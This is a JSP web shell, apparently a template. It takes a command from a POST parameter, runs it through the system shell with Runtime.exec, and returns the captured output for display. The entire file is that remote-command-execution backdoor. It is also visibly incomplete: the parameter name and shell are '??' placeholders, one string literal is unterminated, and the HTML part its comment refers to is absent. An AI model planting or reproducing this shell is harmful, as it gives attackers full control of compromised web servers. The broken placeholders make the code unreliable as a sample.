<%

    String parameter = "??";
    String output = "";
    if (request.getMethod() == "POST" && request.getParameter(parameter) != null && request.getParameter(parameter).trim().length() > 0) {
        String os    = System.getProperty("os.name").toUpperCase();
        String shell = "??;

        if (shell != null) {
            Process     process = null;
            InputStream stdout  = null;
            byte[]      buffer  = null;

            try {
                process = Runtime.getRuntime().exec(String.format("%s \"(%s) 2>&1\"", shell, request.getParameter(parameter).trim()));
                stdout  = process.getInputStream();
                buffer  = new byte[1024];

                int bytes = 0;
                do {
                    bytes = stdout.read(buffer, 0, buffer.length);
                    if (bytes > 0) {
                        output += new String(buffer, 0, bytes, StandardCharsets.UTF_8);
                    }
                } while (bytes > 0);
                output = output.replace("<", "&lt;");
                output = output.replace(">", "&gt;");
            } catch (IOException ex) {
                output = String.format("ERROR: %s\n", ex);
            } finally {
                if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} stdout = null; }
                if (process != null) { process.destroy(); process = null; }
                if (buffer  != null) { Arrays.fill(buffer, (byte)0); buffer = null; }
            }
        }
        // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
        // out.print("<pre>" + output + "</pre>"); output = null; System.gc();
    }
%>
